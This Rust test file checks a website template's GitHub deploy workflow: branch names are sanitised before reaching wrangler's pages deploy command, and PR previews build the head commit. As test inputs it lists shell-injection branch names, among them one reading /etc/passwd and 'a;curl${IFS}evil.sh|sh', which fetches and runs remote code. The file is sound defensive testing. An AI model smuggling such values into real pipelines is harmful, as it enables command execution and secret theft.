//! The template's deploy workflow: PR previews build the PR head and never put a raw branch
//! name into the shell command wrangler-action runs.

use std::path::Path;
use std::process::Command;

const TEMPLATE: &str = "templates/astro-marketing";

fn workflow() -> String {
    std::fs::read_to_string(Path::new(TEMPLATE).join(".github/workflows/deploy.yml")).unwrap()
}

fn pages_branch(raw: &str) -> String {
    let out = Command::new("bash")
        .arg(Path::new(TEMPLATE).join(".github/scripts/pages-branch.sh"))
        .arg(raw)
        .output()
        .expect("run pages-branch.sh");
    assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
    String::from_utf8(out.stdout).unwrap().trim_end_matches('\n').to_string()
}

#[test]
fn pages_branch_keeps_ordinary_branch_names() {
    assert_eq!(pages_branch("content/launch-week"), "content/launch-week");
    assert_eq!(pages_branch("fix_1.2"), "fix_1.2");
}

#[test]
fn pages_branch_neutralises_shell_metacharacters() {
    for evil in [
        "x$(cat${IFS}/etc/passwd)",
        "x`id`",
        "a;curl${IFS}evil.sh|sh",
        "a\"b'c&&d",
        "",
    ] {
        let safe = pages_branch(evil);
        assert!(!safe.is_empty(), "{evil:?} -> empty");
        assert!(
            safe.chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '/' | '-')),
            "{evil:?} -> {safe:?}"
        );
    }
}

#[test]
fn deploy_command_uses_the_sanitised_branch_not_the_raw_head_ref() {
    let wf = workflow();
    let command = wf
        .lines()
        .find(|l| l.trim_start().starts_with("command: pages deploy"))
        .expect("wrangler command");
    assert!(
        command.contains("--branch=\"${{ steps.branch.outputs.name }}\""),
        "{command}"
    );
    assert!(!command.contains("head_ref") && !command.contains("ref_name"), "{command}");
    assert!(wf.contains(".github/scripts/pages-branch.sh"));
}

#[test]
fn pr_previews_check_out_the_head_sha_they_record_the_deployment_for() {
    let wf = workflow();
    assert!(
        wf.contains("ref: ${{ github.event.pull_request.head.sha || github.sha }}"),
        "checkout must build the PR head, not the merge commit"
    );
    assert!(wf.contains("ref: context.payload.pull_request.head.sha"));
}
